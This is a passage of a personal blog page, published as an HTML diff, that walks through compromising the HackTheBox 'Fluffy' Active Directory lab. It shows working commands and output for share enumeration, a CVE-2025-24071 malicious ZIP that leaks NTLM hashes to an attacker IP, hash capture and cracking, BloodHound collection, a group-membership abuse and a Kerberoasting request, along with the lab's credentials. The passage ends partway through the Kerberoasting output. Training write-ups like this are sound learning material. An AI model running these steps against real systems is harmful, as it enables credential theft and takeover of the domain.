@@ -1,0 +1,1673 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <meta name="description" content="Kaulik Makwana - Cybersecurity Engineer & Penetration Tester">
+    <title>Fluffy (HTB) - Active Directory Attack Walkthrough | Kaulik Makwana</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="/assets/images/favicon/favicon.png">
+    
+    <!-- TailwindCSS via CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        'cyber-green': '#4ade80',
+                        'cyber-black': '#0a0a0a',
+                        'cyber-gray': '#1a1a1a',
+                    },
+                    animation: {
+                        'terminal-cursor': 'blink 1s step-end infinite',
+                    },
+                    keyframes: {
+                        blink: {
+                            '0%, 100%': { opacity: '1' },
+                            '50%': { opacity: '0' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <!-- JetBrains Mono Font -->
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- AOS CSS -->
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/assets/css/styles.css">
+    
+    <!-- Prism.js for syntax highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-tomorrow.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/prism.min.js"></script>
+    
+    <!-- Marked.js for Markdown rendering -->
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    
+    <!-- Custom styles -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap');
+
+        :root {
+            --cyber-black: #111111;
+            --cyber-gray: #1a1a1a;
+            --cyber-green: #4ade80;
+            --animation-timing: cubic-bezier(0.16, 1, 0.3, 1);
+            --animation-quick: 0.2s;
+            --animation-normal: 0.3s;
+            --animation-slow: 0.5s;
+            --spring-timing: cubic-bezier(0.37, 0, 0.63, 1);
+        }
+
+        /* Core styles */
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background-color: var(--cyber-black);
+            color: #e5e7eb;
+            opacity: 0;
+            animation: fadeIn 0.4s var(--spring-timing) forwards;
+        }
+
+        /* Animation keyframes */
+        @keyframes fadeIn {
+            from { 
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.2); }
+            50% { box-shadow: 0 0 15px 5px rgba(74, 222, 128, 0.1); }
+            100% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0); }
+        }
+
+        @keyframes terminalCursor {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        @keyframes gridPulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Enhanced button animations */
+        .nav-button {
+            position: relative;
+            overflow: hidden;
+            transition: all var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 100%;
+            background: rgba(74, 222, 128, 0.1);
+            transform: translate(-50%, -50%) scale(0);
+            border-radius: inherit;
+            transition: transform var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-button:hover::before {
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .nav-button:active {
+            transform: scale(0.98);
+        }
+
+        /* Enhanced glass effect */
+        .glass {
+            background: rgba(26, 26, 26, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(74, 222, 128, 0.1);
+            transition: all var(--animation-normal) var(--spring-timing);
+        }
+
+        .glass:hover {
+            border-color: rgba(74, 222, 128, 0.2);
+            box-shadow: 0 0 20px rgba(74, 222, 128, 0.1);
+        }
+
+        /* Navigation link animations */
+        .nav-link {
+            position: relative;
+            transition: color var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: var(--cyber-green);
+            transform: scaleX(0);
+            transform-origin: right;
+            transition: transform var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-link:hover::after {
+            transform: scaleX(1);
+            transform-origin: left;
+        }
+
+        /* Terminal cursor animation */
+        .terminal-cursor {
+            display: inline-block;
+            width: 8px;
+            height: 1em;
+            background: var(--cyber-green);
+            margin-left: 4px;
+            animation: blink 1s step-end infinite;
+            opacity: 0.7;
+            vertical-align: text-bottom;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 0.7; }
+        }
+
+        /* Enhanced scroll indicator */
+        .scroll-indicator {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--cyber-green), transparent);
+            z-index: 1000;
+            transform-origin: left;
+            transition: transform var(--animation-quick) var(--spring-timing);
+        }
+
+        /* Mobile Optimizations */
+        @media (max-width: 768px) {
+            .container {
+                padding-left: 1rem;
+                padding-right: 1rem;
+            }
+
+            .mobile-nav {
+                display: none;
+                position: fixed;
+                top: 4rem;
+                left: 0;
+                right: 0;
+                background: rgba(26, 26, 26, 0.95);
+                backdrop-filter: blur(12px);
+                -webkit-backdrop-filter: blur(12px);
+                padding: 1rem;
+                z-index: 50;
+                border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+            }
+
+            .mobile-nav.active {
+                display: block;
+                animation: slideDown 0.2s ease-out;
+            }
+
+            @keyframes slideDown {
+                from {
+                    transform: translateY(-10px);
+                    opacity: 0;
+                }
+                to {
+                    transform: translateY(0);
+                    opacity: 1;
+                }
+            }
+
+            .mobile-nav a {
+                display: block;
+                padding: 0.75rem 1rem;
+                color: #e5e7eb;
+                font-size: 1rem;
+                border-radius: 0.375rem;
+                transition: all 0.2s ease;
+                margin-bottom: 0.5rem;
+                border: 1px solid transparent;
+            }
+
+            .mobile-nav a:hover,
+            .mobile-nav a.active {
+                background: rgba(74, 222, 128, 0.1);
+                border-color: rgba(74, 222, 128, 0.2);
+                color: var(--cyber-green);
+            }
+
+            .menu-button {
+                display: flex;
+                flex-direction: column;
+                justify-content: space-between;
+                width: 24px;
+                height: 20px;
+                padding: 0;
+                background: transparent;
+                border: none;
+                cursor: pointer;
+            }
+
+            .menu-button span {
+                display: block;
+                width: 100%;
+                height: 2px;
+                background: var(--cyber-green);
+                transition: all 0.2s ease;
+            }
+
+            .menu-button.active span:nth-child(1) {
+                transform: translateY(9px) rotate(45deg);
+            }
+
+            .menu-button.active span:nth-child(2) {
+                opacity: 0;
+            }
+
+            .menu-button.active span:nth-child(3) {
+                transform: translateY(-9px) rotate(-45deg);
+            }
+
+            /* Typography Adjustments */
+            h1 { font-size: 1.875rem !important; }
+            h2 { font-size: 1.5rem !important; }
+            h3 { font-size: 1.25rem !important; }
+
+            /* Content Spacing */
+            .content-wrapper {
+                padding-top: 1rem;
+            }
+
+            /* Navigation Adjustments */
+            .nav-link {
+                padding: 0.5rem;
+            }
+
+            /* Button Adjustments */
+            .btn {
+                padding: 0.5rem 1rem;
+                font-size: 0.875rem;
+            }
+        }
+
+        /* Preserve Desktop Styles */
+        @media (min-width: 769px) {
+            .menu-button {
+                display: none;
+            }
+
+            .mobile-nav {
+                display: none;
+            }
+        }
+
+        /* Safe Area Insets */
+        @supports(padding: max(0px)) {
+            .container {
+                padding-left: max(1rem, env(safe-area-inset-left));
+                padding-right: max(1rem, env(safe-area-inset-right));
+            }
+
+            .mobile-nav {
+                padding-bottom: max(1rem, env(safe-area-inset-bottom));
+            }
+        }
+
+        /* Markdown Content Styles */
+        .markdown-content ul {
+            list-style-type: none;
+            padding-left: 1.75rem;
+            margin: 1rem 0;
+        }
+
+        .markdown-content ul > li {
+            position: relative;
+            margin: 0.5rem 0;
+            padding-left: 0.5rem;
+        }
+
+        .markdown-content ul > li::before {
+            content: ">";
+            position: absolute;
+            left: -1.5rem;
+            color: var(--cyber-green);
+            opacity: 0.8;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .markdown-content ul > li > ul {
+            margin-top: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .markdown-content ul > li > ul > li::before {
+            content: "-";
+        }
+
+        .markdown-content ol {
+            counter-reset: section;
+            list-style-type: none;
+            padding-left: 2.5rem;
+            margin: 1rem 0;
+        }
+
+        .markdown-content ol > li {
+            counter-increment: section;
+            position: relative;
+            margin: 0.75rem 0;
+            padding-left: 0.5rem;
+        }
+
+        .markdown-content ol > li::before {
+            content: counter(section) ".";
+            position: absolute;
+            left: -2.5rem;
+            width: 2rem;
+            text-align: right;
+            color: var(--cyber-green);
+            font-weight: 500;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .markdown-content ol > li > ol {
+            counter-reset: subsection;
+            margin-top: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .markdown-content ol > li > ol > li {
+            counter-increment: subsection;
+            margin: 0.5rem 0;
+        }
+
+        .markdown-content ol > li > ol > li::before {
+            content: counter(section) "." counter(subsection);
+        }
+
+        /* Table Styles */
+        .markdown-content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            background: rgba(26, 26, 26, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(74, 222, 128, 0.1);
+            border-radius: 0.5rem;
+            overflow-x: auto;
+            display: block;
+        }
+
+        .markdown-content th {
+            background: rgba(55, 65, 81, 0.5);
+            text-align: left;
+            padding: 0.75rem 1rem;
+            font-weight: 600;
+            border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+            color: var(--cyber-green);
+            white-space: nowrap;
+        }
+
+        .markdown-content td {
+            padding: 0.75rem 1rem;
+            border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+            min-width: 100px;
+        }
+
+        .markdown-content tr:hover {
+            background: rgba(74, 222, 128, 0.05);
+            transition: background-color 0.2s;
+        }
+
+        @media (max-width: 768px) {
+            .markdown-content table {
+                margin: 1rem -1rem;
+                border-radius: 0;
+            }
+
+            .markdown-content th,
+            .markdown-content td {
+                padding: 0.5rem 0.75rem;
+            }
+
+            .markdown-content ul {
+                padding-left: 1.5rem;
+            }
+
+            .markdown-content ol {
+                padding-left: 2rem;
+            }
+
+            .markdown-content ul > li::before {
+                left: -1.25rem;
+            }
+
+            .markdown-content ol > li::before {
+                left: -2rem;
+                width: 1.75rem;
+            }
+        }
+    </style>
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Fluffy (HTB) - Active Directory Attack Walkthrough | Kaulik Makwana</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Fluffy (HTB) - Active Directory Attack Walkthrough" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Overview This walkthrough details the step-by-step process of compromising the “Fluffy” Windows Active Directory environment on HackTheBox. The attack path demonstrates real-world red team tactics, including enumeration, exploitation, lateral movement, and privilege escalation, with a focus on ADCS and Kerberos abuse." />
+<meta property="og:description" content="Overview This walkthrough details the step-by-step process of compromising the “Fluffy” Windows Active Directory environment on HackTheBox. The attack path demonstrates real-world red team tactics, including enumeration, exploitation, lateral movement, and privilege escalation, with a focus on ADCS and Kerberos abuse." />
+<link rel="canonical" href="https://kaulikmakwana.github.io/writeups/hackthebox/Fluffy-Hackthebox-Walkthrough/" />
+<meta property="og:url" content="https://kaulikmakwana.github.io/writeups/hackthebox/Fluffy-Hackthebox-Walkthrough/" />
+<meta property="og:site_name" content="Kaulik Makwana" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-06-23T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Fluffy (HTB) - Active Directory Attack Walkthrough" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-23T00:00:00+00:00","datePublished":"2025-06-23T00:00:00+00:00","description":"Overview This walkthrough details the step-by-step process of compromising the “Fluffy” Windows Active Directory environment on HackTheBox. The attack path demonstrates real-world red team tactics, including enumeration, exploitation, lateral movement, and privilege escalation, with a focus on ADCS and Kerberos abuse.","headline":"Fluffy (HTB) - Active Directory Attack Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://kaulikmakwana.github.io/writeups/hackthebox/Fluffy-Hackthebox-Walkthrough/"},"url":"https://kaulikmakwana.github.io/writeups/hackthebox/Fluffy-Hackthebox-Walkthrough/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body class="min-h-screen flex flex-col bg-gradient-to-b from-cyber-black to-cyber-gray">
+    <!-- Scroll Progress Indicator -->
+    <div class="scroll-indicator"></div>
+
+    <!-- Navigation -->
+    <nav class="fixed w-full top-0 glass z-50">
+        <div class="max-w-6xl mx-auto px-4">
+            <div class="flex justify-between items-center h-16">
+                <a href="/" class="group flex items-center space-x-2">
+                    <span class="text-xl font-bold text-cyber-green">[KM]</span>
+                    <span class="hidden md:inline text-sm text-gray-400 group-hover:text-cyber-green transition-colors">~/offensive-security</span>
+                    <span class="terminal-cursor"></span>
+                </a>
+                
+                <!-- Desktop Navigation -->
+                <div class="hidden md:flex space-x-6">
+                    <a href="/" class="nav-link ">~/home</a>
+                    <a href="/about" class="nav-link ">~/about</a>
+                    <a href="/writeups" class="nav-link active text-cyber-green">~/writeups</a>
+                    <a href="/learnings" class="nav-link ">~/learnings</a>
+                </div>
+
+                <!-- Mobile Menu Button -->
+                <button class="md:hidden menu-button" id="menuButton" aria-label="Toggle menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Mobile Navigation -->
+        <div class="mobile-nav md:hidden" id="mobileNav">
+            <a href="/" class="">~/home</a>
+            <a href="/about" class="">~/about</a>
+            <a href="/writeups" class="active">~/writeups</a>
+            <a href="/learnings" class="">~/learnings</a>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="flex-grow pt-16">
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" rel="stylesheet" />
+
+<!-- Main Container with Border (matches home page) -->
+<article class="min-h-screen relative py-6 md:py-12">
+    <div class="absolute inset-0 bg-[linear-gradient(rgba(26,26,26,0.5)_2px,transparent_2px),linear-gradient(90deg,rgba(26,26,26,0.5)_2px,transparent_2px)] bg-[size:50px_50px] [mask-image:radial-gradient(ellipse_80%_80%_at_50%_50%,black,transparent)]"></div>
+    <div class="max-w-7xl mx-auto px-2 sm:px-4 relative">
+        <div class="glass border border-cyber-green/10 rounded-2xl p-4 sm:p-8 flex flex-col min-h-[60vh] justify-center">
+            <!-- Back to Writeups Link -->
+            <div class="mb-3 sm:mb-4 md:mb-6 lg:mb-8 w-full" data-aos="fade-right" data-aos-delay="200">
+                <a href="/writeups" class="group inline-flex items-center justify-center bg-cyber-black/50 text-cyber-green px-3 py-2 sm:px-4 sm:py-2.5 rounded-lg hover:bg-cyber-black/70 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 text-xs sm:text-sm">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-3.5 w-3.5 sm:h-4 sm:w-4 mr-1.5 sm:mr-2 transform group-hover:-translate-x-1 transition-transform duration-300" viewBox="0 0 20 20" fill="currentColor">
+                        <path fill-rule="evenodd" d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z" clip-rule="evenodd" />
+                    </svg>
+                    <span class="font-mono">cd ../writeups</span>
+                </a>
+            </div>
+
+            <header class="mb-4 sm:mb-6 md:mb-8 lg:mb-10 w-full">
+                <div class="terminal-text mb-2 sm:mb-3 text-cyber-green text-xs sm:text-sm font-mono opacity-60" data-aos="fade-up" data-aos-delay="400">
+                    <span class="opacity-50">$</span> cat fluffy-htb-active-directory-attack-walkthrough.md
+                </div>
+                <h1 class="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold bg-gradient-to-r from-cyber-green to-emerald-400 bg-clip-text text-transparent break-words" data-aos="fade-up" data-aos-delay="600">Fluffy (HTB) - Active Directory Attack Walkthrough</h1>
+                <div class="text-gray-400 mt-1.5 sm:mt-2 font-mono text-xs sm:text-sm" data-aos="fade-up" data-aos-delay="800">
+                    
+                        <span class="text-cyber-green">></span> June 23, 2025
+                        
+                        <span class="text-cyber-green mx-2">|</span> <span class="text-cyber-green">HackTheBox</span>
+                        
+                    
+                </div>
+            </header>
+
+            <div class="markdown-content prose prose-invert max-w-none font-mono text-xs sm:text-sm w-full" data-aos="fade-up" data-aos-delay="1000">
+                <h2 id="section-overview">Overview</h2>
+<p>This walkthrough details the step-by-step process of compromising the “Fluffy” Windows Active Directory environment on HackTheBox. The attack path demonstrates real-world red team tactics, including enumeration, exploitation, lateral movement, and privilege escalation, with a focus on ADCS and Kerberos abuse.</p>
+
+<hr />
+
+<h2 id="section-1-initial-access--enumeration">1. Initial Access &amp; Enumeration</h2>
+<ul>
+  <li><strong>Credentials Provided:</strong> <code class="language-plaintext highlighter-rouge">j.fleischman / J0elTHEM4n1990!</code></li>
+  <li><strong>Target:</strong> 10.10.11.69 (Windows AD)</li>
+</ul>
+
+<h3 id="section-port--service-discovery">Port &amp; Service Discovery</h3>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap 10.10.11.69
+
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman
+</code></pre></div></div>
+<ul>
+  <li>Key services: Kerberos, LDAP, SMB, WinRM, etc.</li>
+</ul>
+
+<h3 id="section-user--share-enumeration">User &amp; Share Enumeration</h3>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb 10.10.11.69 <span class="nt">-u</span> j.fleischman <span class="nt">-p</span> <span class="s1">'J0elTHEM4n1990!'</span> <span class="nt">--users</span>
+
+SMB                      10.10.11.69     445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:fluffy.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB                      10.10.11.69     445    DC01             <span class="o">[</span>+] fluffy.htb<span class="se">\j</span>.fleischman:J0elTHEM4n1990! 
+SMB                      10.10.11.69     445    DC01             <span class="nt">-Username-</span>                    <span class="nt">-Last</span> PW Set-       <span class="nt">-BadPW-</span> <span class="nt">-Description-</span>                        
+SMB                      10.10.11.69     445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account <span class="k">for </span>administering the computer/domain
+SMB                      10.10.11.69     445    DC01             Guest                         &lt;never&gt;             0       Built-in account <span class="k">for </span>guest access to the computer/domain
+SMB                      10.10.11.69     445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account
+SMB                      10.10.11.69     445    DC01             ca_svc                        2025-04-17 16:07:50 0        
+SMB                      10.10.11.69     445    DC01             ldap_svc                      2025-04-17 16:17:00 0        
+SMB                      10.10.11.69     445    DC01             p.agila                       2025-04-18 14:37:08 0        
+SMB                      10.10.11.69     445    DC01             winrm_svc                     2025-05-18 00:51:16 0        
+SMB                      10.10.11.69     445    DC01             j.coffey                      2025-04-19 12:09:55 0        
+SMB                      10.10.11.69     445    DC01             j.fleischman                  2025-05-16 14:46:55 0        
+SMB                      10.10.11.69     445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerated 9 <span class="nb">local users</span>: FLUFFY
+
+netexec smb 10.10.11.69 <span class="nt">-u</span> j.fleischman <span class="nt">-p</span> <span class="s1">'J0elTHEM4n1990!'</span> <span class="nt">--shares</span> 
+
+SMB         10.10.11.69     445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:fluffy.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> 
+SMB         10.10.11.69     445    DC01             <span class="o">[</span>+] fluffy.htb<span class="se">\j</span>.fleischman:J0elTHEM4n1990! 
+SMB         10.10.11.69     445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerated shares
+SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
+SMB         10.10.11.69     445    DC01             <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.11.69     445    DC01             ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.11.69     445    DC01             C<span class="nv">$ </span>                             Default share
+SMB         10.10.11.69     445    DC01             IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
+SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share 
+
+<span class="c"># Found writable share named IT</span>
+</code></pre></div></div>
+
+<p>-&gt; exploring <code class="language-plaintext highlighter-rouge">IT</code> share</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> impacket-smbclient j.fleischman:<span class="s1">'J0elTHEM4n1990!'</span>@10.10.11.69 
+ <span class="c"># get Upgrade_Notice.pdf</span>
+ <span class="c"># get Everything-1.4.1.1026.x64.zip</span>
+ <span class="c"># get KeePass-2.58.zip</span>
+</code></pre></div></div>
+
+<p>-&gt; Download files and read notice pdf.
+–&gt;by reviewing pdf we can  exploiting CVE-2025-24071 .</p>
+
+<hr />
+
+<h2 id="section-2-exploitation-ntlm-hash-leak-cve-2025-24071">2. Exploitation: NTLM Hash Leak (CVE-2025-24071)</h2>
+<p>1) fireup msfconsole</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole <span class="nt">-q</span>
+msf6 <span class="o">&gt;</span> search CVE-2025-24071
+<span class="c"># exploit used auxiliary/windows/misc/ntlm_hash_leak</span>
+<span class="nb">set </span>attacker_ip 10.10.16.23
+<span class="nb">set </span>filename hacked.zip
+run 
+<span class="c"># will generate zip file</span>
+
+<span class="c"># exploitation steps</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Malicious ZIP file created: hacked.zip
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Host the file and <span class="nb">wait </span><span class="k">for </span>the victim to extract it.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Ensure you have an SMB capture server running to collect NTLM hashes.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed 
+</code></pre></div></div>
+
+<p>2) start ntlm capture server</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># msfconsole</span>
+use server/capture/smb
+run
+</code></pre></div></div>
+
+<p>3) upload hacked.zip file and execute on victim</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> smbclient //10.10.11.69/it <span class="nt">-U</span> j.fleischman  <span class="c"># pass J0elTHEM4n1990!</span>
+put hacked.zip
+<span class="nb">tar </span>hacked.zip
+</code></pre></div></div>
+
+<h3 id="section---now-coming-back-to-smb-server-back">-&gt; Now coming back to smb server back</h3>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Received SMB connection on Auth Capture Server!
+<span class="o">[</span>SMB] NTLMv2-SSP Client     : 10.10.11.69
+
+.. <span class="nb">.</span>
+.. <span class="nb">.</span>
+
+<span class="o">[</span>+] Received SMB connection on Auth Capture Server!
+<span class="o">[</span>SMB] NTLMv2-SSP Client     : 10.10.11.69
+<span class="o">[</span>SMB] NTLMv2-SSP Username   : FLUFFY<span class="se">\p</span>.agila
+<span class="o">[</span>SMB] NTLMv2-SSP Hash       : p.agila::FLUFFY:1e92d1bc8ef6d5e9:29f16b8ec07f6f473bbfdc065b55b08d:010100000000000080e7aae8e0e1db01130df1f701f88905000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f00550050000700080080e7aae8e0e1db01060004000200000008003000300000000000000001000000002000007dc4a945ac29448907e13c995899e7d52d1b6e0a7e0c69468ea099fd7719fa310a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320033000000000000000000
+
+</code></pre></div></div>
+
+<p>-&gt; got NTLMv2  hashes but can not use it because impacket-scripts suports NTLMv1 hashes so we need to crack hashes .</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># save hash into file and fire up john </span>
+john  <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt 
+
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Will run 12 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+prometheusx-303  <span class="o">(</span>p.agila<span class="o">)</span>     
+1g 0:00:00:01 DONE <span class="o">(</span>2025-06-20 18:51<span class="o">)</span> 0.6578g/s 2974Kp/s 2974Kc/s 2974KC/s proquis..prison only
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<p>-&gt; Found username : <code class="language-plaintext highlighter-rouge">p.agila</code> password : <code class="language-plaintext highlighter-rouge">prometheusx-303</code></p>
+
+<hr />
+
+<h2 id="section-3-bloodhound--group-escalation">3. BloodHound &amp; Group Escalation</h2>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># using bloodhound-python (cli version) tool to find relationships..</span>
+bloodhound-python <span class="nt">-c</span> all <span class="nt">-d</span> fluffy.htb <span class="nt">-u</span> p.agila <span class="nt">-p</span> prometheusx-303 <span class="nt">--zip</span> <span class="nt">-ns</span> 10.10.11.69
+
+INFO: BloodHound.py <span class="k">for </span>BloodHound LEGACY <span class="o">(</span>BloodHound 4.2 and 4.3<span class="o">)</span>
+INFO: Found AD domain: fluffy.htb
+INFO: Getting TGT <span class="k">for </span>user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Found 1 domains
+INFO: Found 1 domains <span class="k">in </span>the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Found 10 <span class="nb">users
+</span>INFO: Found 54 <span class="nb">groups
+</span>INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.fluffy.htb
+WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
+WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
+INFO: Done <span class="k">in </span>00M 54S
+INFO: Compressing output into 20250620195310_bloodhound.zip
+</code></pre></div></div>
+
+<p>-&gt; Analysing files by unzipping 20250620195310_bloodhound zipfile.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># add p.agila into service account using bloodyAD tool</span>
+bloodyAD <span class="nt">-u</span> p.agila <span class="nt">-p</span> prometheusx-303 <span class="nt">--host</span> 10.10.11.69 <span class="nt">-d</span> dc01.fluffy.htb add groupMember <span class="s1">'SERVICE ACCOUNTS'</span> <span class="s1">'p.agila'</span>                                
+
+<span class="o">[</span>+] p.agila added to SERVICE ACCOUNTS
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="section-4-shadow-credentials-attack-winrm_svc">4. Shadow Credentials Attack (winrm_svc)</h2>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> impacket-GetUserSPNs <span class="nt">-request</span> <span class="nt">-dc-ip</span> 10.10.11.69 <span class="s1">'fluffy.htb'</span>/<span class="s1">'p.agila'</span>:<span class="s1">'prometheusx-303'</span> 
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
+<span class="nt">----------------------</span>  <span class="nt">---------</span>  <span class="nt">---------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
